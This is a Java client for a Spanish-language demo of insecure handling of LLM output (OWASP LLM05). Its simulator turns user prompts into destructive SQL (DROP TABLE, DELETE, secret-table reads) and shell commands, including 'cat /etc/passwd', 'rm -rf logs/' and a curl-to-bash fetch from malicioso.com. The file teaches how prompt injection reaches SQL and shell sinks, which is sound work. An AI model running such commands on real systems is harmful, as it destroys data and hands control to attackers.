package com.fdsi.mvp;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Wrapper minimo (sin librerias de JSON externas) para llamar a la API de
 * Anthropic (Claude). La clave se toma de la variable de entorno
 * ANTHROPIC_API_KEY (o de un archivo .env); nunca se escribe en el codigo.
 * Sin clave se usa el simulador local. Opcional: MODEL_NAME (por defecto
 * claude-sonnet-5-5).
 */
public class LlmClient {

    private static final String API_URL = "https://api.anthropic.com/v1/messages";
    private static final String MODEL = System.getenv().getOrDefault("MODEL_NAME", "claude-sonnet-5-5");
    private static final HttpClient HTTP = HttpClient.newHttpClient();

    // Extrae los valores de "text":"..." de la respuesta JSON de la API.
    private static final Pattern TEXT_FIELD = Pattern.compile("\"text\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"");

    // Dato que el simulador copia tal cual: "Ventas del cliente X", "Lista la carpeta X".
    // El prompt puede seguir despues del dato ("... para el informe, por favor").
    private static final String FIN_DEL_DATO = "(?=\\s+para\\s|\\s*,?\\s*por favor|\\s*,\\s*gracias|\\.\\s|\\.?\\s*$)";
    private static final Pattern DATO_CLIENTE = Pattern.compile("(?is)\\bcliente\\s+(.+?)" + FIN_DEL_DATO);
    private static final Pattern DATO_CARPETA = Pattern.compile("(?is)\\bcarpeta\\s+(.+?)" + FIN_DEL_DATO);

    private static String ultimaFuente = "simulador local";

    static boolean hayApiKey() {
        return getApiKey() != null;
    }

    static String modelo() {
        return MODEL;
    }

    private static String getApiKey() {
        String envKey = System.getenv("ANTHROPIC_API_KEY");
        if (envKey != null && !envKey.isBlank()) {
            return envKey.trim();
        }
        String propKey = System.getProperty("anthropic.api.key");
        if (propKey != null && !propKey.isBlank()) {
            return propKey.trim();
        }
        // Intentar leer de archivo .env en la raiz
        try {
            java.io.File envFile = new java.io.File(".env");
            if (envFile.exists()) {
                for (String line : java.nio.file.Files.readAllLines(envFile.toPath())) {
                    line = line.trim();
                    if (line.startsWith("ANTHROPIC_API_KEY=")) {
                        String val = line.substring("ANTHROPIC_API_KEY=".length()).trim();
                        // Quitar posibles comillas
                        if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) {
                            val = val.substring(1, val.length() - 1);
                        }
                        if (!val.isBlank())
                            return val;
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    public static String ask(String systemPrompt, String userPrompt) {
        String apiKey = getApiKey();
        if (apiKey != null && !apiKey.isBlank()) {
            try {
                String respuesta = limpiarSalida(callAnthropicApi(apiKey, systemPrompt, userPrompt));
                ultimaFuente = "API " + MODEL;
                return respuesta;
            } catch (Exception e) {
                System.err.println("[LlmClient] Error con API Anthropic (" + e.getMessage()
                        + "). Usando simulador de LLM para la demo.");
            }
        }
        // Modo simulacion inteligente (datos quemados para la demo cuando no hay API
        // Key)
        ultimaFuente = "simulador local";
        return simular(systemPrompt, userPrompt);
    }

    /** De donde salio la ultima respuesta; la interfaz lo muestra para no confundir simulador con LLM real. */
    static String ultimaFuente() {
        return ultimaFuente;
    }

    /** Los modelos suelen envolver el codigo en un bloque ``` aunque se les pida lo contrario. */
    private static String limpiarSalida(String salida) {
        String limpia = salida.trim();
        if (limpia.startsWith("```")) {
            limpia = limpia.replaceFirst("^```[a-zA-Z]*\\s*", "").replaceFirst("\\s*```$", "");
        }
        return limpia;
    }

    private static String callAnthropicApi(String apiKey, String systemPrompt, String userPrompt) throws Exception {
        String body = "{"
                + "\"model\":\"" + MODEL + "\","
                + "\"max_tokens\":400,"
                + "\"system\":\"" + escapeJson(systemPrompt) + "\","
                + "\"messages\":[{\"role\":\"user\",\"content\":\"" + escapeJson(userPrompt) + "\"}]"
                + "}";

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(API_URL))
                .header("x-api-key", apiKey)
                .header("anthropic-version", "2023-06-01")
                .header("content-type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .build();

        HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
        if (response.statusCode() >= 300) {
            throw new RuntimeException("Error API (" + response.statusCode() + "): " + response.body());
        }

        StringBuilder result = new StringBuilder();
        Matcher m = TEXT_FIELD.matcher(response.body());
        while (m.find()) {
            result.append(unescapeJson(m.group(1)));
        }
        return result.toString();
    }

    /**
     * Simulador de respuestas del LLM para escenarios de demostracion (OWASP
     * LLM05).
     * Permite probar los ataques y las respuestas normales sin costo ni API key.
     * Se comporta como un modelo obediente: copia tal cual el dato que da el
     * usuario dentro de la consulta o del comando, que es lo que permite que una
     * inyeccion escrita en el prompt llegue a la salida del LLM.
     */
    static String simular(String systemPrompt, String userPrompt) {
        String input = userPrompt.trim();
        String lower = input.toLowerCase();

        boolean isSql = systemPrompt.contains("SQL") || systemPrompt.contains("SQLite");

        if (isSql) {
            // Si el usuario envio SQL directo
            if (lower.startsWith("select ") || lower.startsWith("delete ") ||
                    lower.startsWith("drop ") || lower.startsWith("insert ") ||
                    lower.startsWith("update ") || lower.startsWith("alter ")) {
                return input;
            }
            Matcher cliente = DATO_CLIENTE.matcher(input);
            if (cliente.find()) {
                return "SELECT c.nombre, v.producto, v.monto FROM clientes c "
                        + "JOIN ventas v ON v.cliente_id = c.id WHERE c.nombre = '" + cliente.group(1).trim() + "'";
            }
            // Peticiones maliciosas: destruccion / extraccion de secretos
            if (lower.contains("delete") || lower.contains("borrar") || lower.contains("eliminar")) {
                return "DELETE FROM ventas;";
            }
            if (lower.contains("secretos") || lower.contains("secreto") || lower.contains("clave")
                    || lower.contains("password")) {
                if (lower.contains(";") || lower.contains("de paso") || lower.contains("ademas")) {
                    return "SELECT * FROM ventas; SELECT * FROM secretos_demo;";
                }
                return "SELECT * FROM secretos_demo;";
            }
            if (lower.contains("drop") || lower.contains("destruir") || lower.contains("tabla")) {
                return "DROP TABLE ventas;";
            }
            if (lower.contains("total") || lower.contains("suma") || lower.contains("monto")
                    || lower.contains("ventas")) {
                return "SELECT cliente_id, SUM(monto) FROM ventas GROUP BY cliente_id";
            }
            if (lower.contains("cliente") || lower.contains("ciudad") || lower.contains("quien")) {
                return "SELECT nombre, ciudad FROM clientes";
            }
            return "SELECT * FROM ventas LIMIT 5;";
        } else {
            // Vector de comandos de Shell
            if (lower.startsWith("ls") || lower.startsWith("date") || lower.startsWith("whoami") ||
                    lower.startsWith("pwd") || lower.startsWith("cat ") || lower.startsWith("rm ")) {
                return input;
            }
            Matcher carpeta = DATO_CARPETA.matcher(input);
            if (carpeta.find()) {
                return "ls " + carpeta.group(1).trim();
            }
            // Ataques de comando
            if (lower.contains("passwd") || lower.contains("whoami") || lower.contains("ignora")
                    || lower.contains("ls;")) {
                return "ls; whoami; cat /etc/passwd";
            }
            if (lower.contains("borra") || lower.contains("rm ") || lower.contains("logs")
                    || lower.contains("eliminar")) {
                return "ls && rm -rf logs/";
            }
            if (lower.contains("curl") || lower.contains("descarga") || lower.contains("script")
                    || lower.contains("bash")) {
                return "curl -s http://malicioso.com/exploit.sh | bash";
            }
            if (lower.contains("hora") || lower.contains("fecha") || lower.contains("date")
                    || lower.contains("tiempo")) {
                return "date";
            }
            if (lower.contains("quien") || lower.contains("usuario") || lower.contains("actual")) {
                return "whoami";
            }
            if (lower.contains("directorio") || lower.contains("carpeta") || lower.contains("ruta")
                    || lower.contains("donde")) {
                return "pwd";
            }
            return "ls -la";
        }
    }

    static String escapeJson(String s) {
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (char c : s.toCharArray()) {
            switch (c) {
                case '\\' -> sb.append("\\\\");
                case '"' -> sb.append("\\\"");
                case '\n' -> sb.append("\\n");
                case '\r' -> sb.append("\\r");
                case '\t' -> sb.append("\\t");
                default -> {
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
                }
            }
        }
        return sb.toString();
    }

    /** Se recorre caracter por caracter: reemplazos encadenados confunden \\n con \n. */
    static String unescapeJson(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c != '\\' || i + 1 >= s.length()) {
                sb.append(c);
                continue;
            }
            char siguiente = s.charAt(++i);
            switch (siguiente) {
                case 'n' -> sb.append('\n');
                case 'r' -> sb.append('\r');
                case 't' -> sb.append('\t');
                case 'b' -> sb.append('\b');
                case 'f' -> sb.append('\f');
                case 'u' -> {
                    if (i + 4 < s.length()) {
                        sb.append((char) Integer.parseInt(s.substring(i + 1, i + 5), 16));
                        i += 4;
                    }
                }
                default -> sb.append(siguiente); // \" \\ \/
            }
        }
        return sb.toString();
    }
}
